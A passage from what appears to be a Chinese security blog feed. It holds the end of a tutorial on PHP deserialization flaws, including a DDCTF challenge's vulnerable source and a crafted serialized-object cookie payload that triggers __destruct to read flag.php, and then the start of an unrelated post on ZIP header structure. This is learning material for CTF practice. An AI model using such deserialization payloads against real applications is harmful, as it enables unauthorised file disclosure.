class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;i am here!&quot;</span>;<br>    &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">method</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I am method!&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$target</span> = <span class="hljs-keyword">new</span> MySerialize(<span class="hljs-string">&quot;value1&quot;</span>,<span class="hljs-number">123</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>.serialize(<span class="hljs-variable">$target</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行结果：</p><img src="/2021/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E9%80%A0%E6%88%90%E7%9A%84%E6%BC%8F%E6%B4%9E/6.jpg" class="" title="php反序列化使用不当造成的漏洞"><p>  这里在触发<code>serialize()</code>方法时直接触发该魔法函数，执行内部代码。这里的变量被NULL序列化，所以看到的是字符N。同样的道理，如果该魔法函数中存在危险函数，就有可能造成漏洞。比如该魔法函数中存在<code>eval()</code>方法，这样就可能造成命令执行漏洞，<code>eval()</code>中如果写有两个`` <code>符号，则里面的内容就会在DOS窗口运行，当然，前提是</code>shell_exec()`方法可用。</p></li><li><p><code>_wakeup()</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">#unserialize5.php<br>&lt;?php<br>class MySerialize<br>&#123;<br>public $nature1;<br>public $nature2;<br>public function __wakeup()<br>    &#123;<br>        echo &quot;&lt;br &#x2F;&gt;I am here!&quot;;<br>    &#125;<br>public function method()<br>&#123;<br>echo &quot;I am method&quot;;<br>&#125;<br>&#125;<br>$target &#x3D; &#39;O:11:&quot;MySerialize&quot;:2:&#123;s:7:&quot;nature1&quot;;s:6:&quot;value1&quot;;s:7:&quot;nature2&quot;;s:6:&quot;value2&quot;;&#125;&#39;;<br>echo unserialize($target);<br>?&gt;<br></code></pre></td></tr></table></figure><p>执行结果：</p><img src="/2021/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E9%80%A0%E6%88%90%E7%9A%84%E6%BC%8F%E6%B4%9E/7.jpg" class="" title="php反序列化使用不当造成的漏洞"><p>  这里可以看到当执行<code>unserialize()</code>方法时就会执行该魔法函数，执行内部代码。因为这里的类对象不能作为一个输出对象，所以payload无效果。同理，如果该魔法函数中存在危险函数，就会造成危险操作。比如，该魔法函数中存在<code>exec()</code>方法，并且参数是可以控制的，那么就有可能造成命令执行漏洞。</p></li><li><p><code>_get()</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">#unserialize6.php<br>&lt;?php<br>class MySerialize<br>&#123;<br>private $nature1;<br>private $nature2;<br>public function __get($nature1)<br>    &#123;<br>        echo &quot;I am here!&quot;;<br>    &#125;<br>&#125;<br>$test &#x3D; new MySerialize();<br>echo $test -&gt; $nature1.&quot;&lt;br &#x2F;&gt;&quot;;<br>$target &#x3D; &#39;O:11:&quot;MySerialize&quot;:2:&#123;s:7:&quot;nature1&quot;;s:6:&quot;value1&quot;;s:7:&quot;nature2&quot;;s:6:&quot;value2&quot;;&#125;&#39;;<br>var_dump(unserialize($target));<br>?&gt;<br></code></pre></td></tr></table></figure><p>执行结果：</p><img src="/2021/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E9%80%A0%E6%88%90%E7%9A%84%E6%BC%8F%E6%B4%9E/8.jpg" class="" title="php反序列化使用不当造成的漏洞"><p>  按常理来说，私有变量是不允许在类外使用的，这里的echo是无法使用的，但是类中存在该魔法函数，所以系统会自动调用它。同理，该魔法函数中如果存在危险函数，并且变量可控，就会造成危险操作。例如：该魔法函数中存在<code>popen()</code>方法，并且变量可控，就会造成文件内容泄漏。也可使用<code>passthru()</code>方法执行系统外部命令。</p></li></ol><p>到这里，就是容易造成漏洞的几个函数的触发条件，剩下的几个暂时还没有做深入学习（其实是感觉剩下的几个触发条件有点苛刻，而且不常用，就不做笔记）。</p><h5 id="CTF题目实例演示："><a href="#CTF题目实例演示：" class="headerlink" title="CTF题目实例演示："></a>CTF题目实例演示：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#Session.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;Application.php&#x27;</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Session</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Application</span> </span>&#123;<br>    <span class="hljs-comment">//key建议为8位字符串</span><br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$eancrykey</span>                  = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$cookie_expiration</span>= <span class="hljs-number">7200</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$cookie_name</span>                = <span class="hljs-string">&#x27;ddctf_id&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$cookie_path</span>= <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$cookie_domain</span>= <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$cookie_secure</span>= <span class="hljs-literal">FALSE</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$activity</span>                   = <span class="hljs-string">&quot;DiDiCTF&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">parent</span>::auth()) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;get_key();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;session_read()) &#123;<br>                <span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;DiDI Welcome you %s&#x27;</span>;<br>                <span class="hljs-variable">$data</span> = sprintf(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>]);<br>                <span class="hljs-built_in">parent</span>::response(<span class="hljs-variable">$data</span>,<span class="hljs-string">&#x27;sucess&#x27;</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;session_create();<br>                <span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;DiDI Welcome you&#x27;</span>;<br>                <span class="hljs-built_in">parent</span>::response(<span class="hljs-variable">$data</span>,<span class="hljs-string">&#x27;sucess&#x27;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_key</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">//eancrykey  and flag under the folder</span><br>        <span class="hljs-keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="hljs-string">&#x27;key.txt&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">session_read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_COOKIE</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>        &#125;<br>        <span class="hljs-variable">$session</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-keyword">$this</span>-&gt;cookie_name];<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$session</span>)) &#123;<br>            <span class="hljs-built_in">parent</span>::response(<span class="hljs-string">&quot;session not found&quot;</span>,<span class="hljs-string">&#x27;error&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>        &#125;<br>        <span class="hljs-variable">$hash</span> = substr(<span class="hljs-variable">$session</span>,strlen(<span class="hljs-variable">$session</span>)-<span class="hljs-number">32</span>);<br>        <span class="hljs-variable">$session</span> = substr(<span class="hljs-variable">$session</span>,<span class="hljs-number">0</span>,strlen(<span class="hljs-variable">$session</span>)-<span class="hljs-number">32</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$hash</span> !== md5(<span class="hljs-keyword">$this</span>-&gt;eancrykey.<span class="hljs-variable">$session</span>)) &#123;<br>            <span class="hljs-built_in">parent</span>::response(<span class="hljs-string">&quot;the cookie data not match&quot;</span>,<span class="hljs-string">&#x27;error&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>        &#125;<br>        <span class="hljs-variable">$session</span> = unserialize(<span class="hljs-variable">$session</span>);<br>        <span class="hljs-keyword">if</span>(!is_array(<span class="hljs-variable">$session</span>) <span class="hljs-keyword">OR</span> !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$session</span>[<span class="hljs-string">&#x27;session_id&#x27;</span>]) <span class="hljs-keyword">OR</span> !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$session</span>[<span class="hljs-string">&#x27;ip_address&#x27;</span>]) <span class="hljs-keyword">OR</span> !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$session</span>[<span class="hljs-string">&#x27;user_agent&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;nickname&quot;</span>])) &#123;<br>            <span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;nickname&quot;</span>],<span class="hljs-keyword">$this</span>-&gt;eancrykey);<br>            <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;Welcome my friend %s&quot;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>                <span class="hljs-variable">$data</span> = sprintf(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$v</span>);<br>            &#125;<br>            <span class="hljs-built_in">parent</span>::response(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;Welcome&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$session</span>[<span class="hljs-string">&#x27;ip_address&#x27;</span>] != <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) &#123;<br>            <span class="hljs-built_in">parent</span>::response(<span class="hljs-string">&#x27;the ip addree not match&#x27;</span>.<span class="hljs-string">&#x27;error&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$session</span>[<span class="hljs-string">&#x27;user_agent&#x27;</span>] != <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>]) &#123;<br>            <span class="hljs-built_in">parent</span>::response(<span class="hljs-string">&#x27;the user agent not match&#x27;</span>,<span class="hljs-string">&#x27;error&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">session_create</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$sessionid</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">while</span>(strlen(<span class="hljs-variable">$sessionid</span>) &lt; <span class="hljs-number">32</span>) &#123;<br>            <span class="hljs-variable">$sessionid</span> .= mt_rand(<span class="hljs-number">0</span>,mt_getrandmax());<br>        &#125;<br>        <span class="hljs-variable">$userdata</span> = <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;session_id&#x27;</span> =&gt; md5(uniqid(<span class="hljs-variable">$sessionid</span>,<span class="hljs-literal">TRUE</span>)),<br>            <span class="hljs-string">&#x27;ip_address&#x27;</span> =&gt; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>],<br>            <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>],<br>            <span class="hljs-string">&#x27;user_data&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        );<br>        <span class="hljs-variable">$cookiedata</span> = serialize(<span class="hljs-variable">$userdata</span>);<br>        <span class="hljs-variable">$cookiedata</span> = <span class="hljs-variable">$cookiedata</span>.md5(<span class="hljs-keyword">$this</span>-&gt;eancrykey.<span class="hljs-variable">$cookiedata</span>);<br>        <span class="hljs-variable">$expire</span> = <span class="hljs-keyword">$this</span>-&gt;cookie_expiration + time();<br>        setcookie(<br>            <span class="hljs-keyword">$this</span>-&gt;cookie_name,<br>            <span class="hljs-variable">$cookiedata</span>,<br>            <span class="hljs-variable">$expire</span>,<br>            <span class="hljs-keyword">$this</span>-&gt;cookie_path,<br>            <span class="hljs-keyword">$this</span>-&gt;cookie_domain,<br>            <span class="hljs-keyword">$this</span>-&gt;cookie_secure<br>            );<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ddctf</span> = <span class="hljs-keyword">new</span> Session();<br><span class="hljs-variable">$ddctf</span>-&gt;index();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>  在这个文件中，可以看到它包含了Application.php文件，且接收进来的数据都通过cookie传送一个序列化字符串，并且通过<code>$session = unserialize($session);</code>将对象反序列化，也就是这个部分是我们可以利用的，再看看Application.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#Application.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">Application</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$path</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">response</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>, <span class="hljs-variable">$errMsg</span> = <span class="hljs-string">&#x27;success&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-variable">$ret</span> = [<span class="hljs-string">&#x27;errMsg&#x27;</span> =&gt; <span class="hljs-variable">$errMsg</span>,<br>            <span class="hljs-string">&#x27;data&#x27;</span> =&gt; <span class="hljs-variable">$data</span>];<br>        <span class="hljs-variable">$ret</span> = json_encode(<span class="hljs-variable">$ret</span>);<br>        header(<span class="hljs-string">&#x27;Content-type: application/json&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ret</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">auth</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$DIDICTF_ADMIN</span> = <span class="hljs-string">&#x27;admin&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_DIDICTF_USERNAME&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_DIDICTF_USERNAME&#x27;</span>] == <span class="hljs-variable">$DIDICTF_ADMIN</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;response(<span class="hljs-string">&#x27;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;response(<span class="hljs-string">&#x27;抱歉，您没有登陆权限，请获取权限后访问-----&#x27;</span>,<span class="hljs-string">&#x27;error&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitizepath</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>    <span class="hljs-variable">$path</span> = trim(<span class="hljs-variable">$path</span>);<br>    <span class="hljs-variable">$path</span>=str_replace(<span class="hljs-string">&#x27;../&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$path</span>);<br>    <span class="hljs-variable">$path</span>=str_replace(<span class="hljs-string">&#x27;..\\&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$path</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$path</span>;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;path)) &#123;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$path</span> = <span class="hljs-keyword">$this</span>-&gt;sanitizepath(<span class="hljs-keyword">$this</span>-&gt;path);<br>        <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$path</span>) !== <span class="hljs-number">18</span>) &#123;<br>            <span class="hljs-keyword">exit</span>();<br>        &#125;<br>        <span class="hljs-keyword">$this</span>-&gt;response(<span class="hljs-variable">$data</span>=file_get_contents(<span class="hljs-variable">$path</span>),<span class="hljs-string">&#x27;Congratulations&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>  这里有一个魔法函数<code>_destruct()</code>，该函数在销毁对象时触发，也就是说只要反序列化对象是我们这个类Application的对象，该函数就会被执行，现在思路就有了，构造cookie为Application的对象，并设置$path路径为要访问的路径就会触发<code>file_get_contents()</code>方法，从而得到文件的值。</p><p>  当然这道题还要绕过其他的一些限制，不过今天的重点不在解这道题，而是要利用反序列化漏洞，这里再献上cookie部分的payload：<code>O:11:&quot;Application&quot;:1:&#123;s:4:&quot;path&quot;;s:8:&quot;flag.php&quot;;&#125;</code>。</p><h3 id="心得总结："><a href="#心得总结：" class="headerlink" title="心得总结："></a>心得总结：</h3><p>  关于反序列化部分我学的还是不够精通，有些部分理解的不够透彻，但我觉得只要理解了被反序列化的类对象所能执行的魔法函数在什么条件下触发，就可以入门这个漏洞了。而且这个漏洞利用的前提：</p><ol><li>类的对象有被反序列化的过程；</li><li>该类中含有魔法函数；</li><li>该魔法函数中有危险函数；</li><li>过滤条件不够完整。</li></ol><p>  以上内容就是我对反序列化的理解，如果哪里不对，请大佬们多多批评～～～～～谢谢🙏大佬！</p><img src="/2021/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E9%80%A0%E6%88%90%E7%9A%84%E6%BC%8F%E6%B4%9E/QQ.png" class="" title="php反序列化使用不当造成的漏洞">]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unserialize</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>对zip压缩包通用格式的认识</title>
    <link href="/2021/05/09/%E5%AF%B9zip%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%80%9A%E7%94%A8%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%AE%A4%E8%AF%86/"/>
    <url>/2021/05/09/%E5%AF%B9zip%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%80%9A%E7%94%A8%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%AE%A4%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>  这几天周围的伙伴都在讨论关于zip压缩包的十六进制格式的一些认识，乘着记忆还算热乎，赶紧记录下来，也算是对这方面的一个小归纳。</p><p>参考文献：</p><p><a href="https://www.cnblogs.com/esingchan/p/3958962.html">https://www.cnblogs.com/esingchan/p/3958962.html</a></p><p><a href="https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt">https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt</a></p><p><a href="https://xz.aliyun.com/t/3994">https://xz.aliyun.com/t/3994</a></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>  还要啰嗦一句：压缩可以分为有损压缩和无损压缩。从名字中就可以看出，有损压缩就是无法将原始的信息完整的保存下来，这就造成解压的时候有一部分信息会被损坏，但它的压缩率高啊，jpg文件就是一种有损压缩，所以一般jpg文件会比png图片模糊，但文件大小会小一点；反之，无损压缩可以完整的保存原始信息，zip就是其中之一，此外还有GZIP，RAR，PNG，GIF等格式的文件也是无损压缩。这里重点记录zip文件格式解析。</p><p>  这里先展示一波从<a href="https://en.wikipedia.org/wiki/Zip_(file_format)">网上</a>抓来的表格：</p><h5 id="文件头实体（0x504B0304）："><a href="#文件头实体（0x504B0304）：" class="headerlink" title="文件头实体（0x504B0304）："></a>文件头实体（0x504B0304）：</h5><table><thead><tr><th align="left">偏移</th><th align="left">字节数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">4</td><td align="left">固定值0x04034b50</td></tr><tr><td align="left">4</td><td align="left">2</td><td align="left">解压缩所需pkware最低版本</td></tr><tr><td align="left">6</td><td align="left">2</td><td align="left">通用比特标志</td></tr><tr><td align="left">8</td><td align="left">2</td><td align="left">压缩方式</td></tr><tr><td align="left">10</td><td align="left">2</td><td align="left">文件最后修改时间</td></tr><tr><td align="left">12</td><td align="left">2</td><td align="left">文件最后修改日期</td></tr><tr><td align="left">14</td><td align="left">4</td><td align="left">CRC-32校验</td></tr><tr><td align="left">18</td><td align="left">4</td><td align="left">压缩后大小</td></tr><tr><td align="left">22</td><td align="left">4</td><td align="left">压缩前大小</td></tr><tr><td align="left">26</td><td align="left">2</td><td align="left">文件名称长度</td></tr><tr><td align="left">28</td><td align="left">2</td><td align="left">文件注释长度</td></tr></tbody></table><h5 id="压缩数据描述符（0x504B0708）："><a href="#压缩数据描述符（0x504B0708）：" class="headerlink" title="压缩数据描述符（0x504B0708）："></a>压缩数据描述符（0x504B0708）：</h5><table><thead><tr><th align="left">偏移</th><th align="left">字节数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">0/4</td><td align="left">固定值0x08074b50</td></tr><tr><td align="left">0/4</td><td align="left">4</td><td align="left">CRC-32校验</td></tr><tr><td align="left">4/8</td><td align="left">4</td><td align="left">压缩后大小</td></tr><tr><td align="left">8/12</td><td align="left">4</td><td align="left">压缩前大小</td></tr></tbody></table><h5 id="压缩内容信息块（0x504B0102）："><a href="#压缩内容信息块（0x504B0102）：" class="headerlink" title="压缩内容信息块（0x504B0102）："></a>压缩内容信息块（0x504B0102）：</h5><table><thead><tr><th align="left">偏移</th><th align="left">字节数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">4</td><td align="left">固定值0x02014b50</td></tr><tr><td align="left">4</td><td align="left">2</td><td align="left">压缩版本</td></tr><tr><td align="left">6</td><td align="left">2</td><td align="left">解压缩所需pkware最低版本</td></tr><tr><td align="left">8</td><td align="left">2</td><td align="left">标志</td></tr><tr><td align="left">10</td><td align="left">2</td><td align="left">压缩方式</td></tr><tr><td align="left">12</td><td align="left">2</td><td align="left">文件最后修改时间</td></tr><tr><td align="left">14</td><td align="left">2</td><td align="left">文件最后修改日期</td></tr><tr><td align="left">16</td><td align="left">4</td><td align="left">CRC-32校验</td></tr><tr><td align="left">20</td><td align="left">4</td><td align="left">压缩后大小</td></tr><tr><td align="left">24</td><td align="left">4</td><td align="left">压缩前大小</td></tr><tr><td align="left">28</td><td align="left">2</td><td align="left">文件名称长度(n)</td></tr><tr><td align="left">30</td><td align="left">2</td><td align="left">扩展字段长度(m)</td></tr><tr><td align="left">32</td><td align="left">2</td><td align="left">文件注释长度(k)</td></tr><tr><td align="left">34</td><td align="left">2</td><td align="left">文件开始的分卷号</td></tr><tr><td align="left">36</td><td align="left">2</td><td align="left">文件内部属性</td></tr><tr><td align="left">38</td><td align="left">4</td><td align="left">文件外部属性</td></tr><tr><td align="left">42</td><td align="left">4</td><td align="left">对应文件实体在文件中的偏移</td></tr><tr><td align="left">46</td><td align="left">n</td><td align="left">文件名称</td></tr><tr><td align="left">46+n</td><td align="left">m</td><td align="left">扩展字段</td></tr><tr><td align="left">46+n+m</td><td align="left">k</td><td 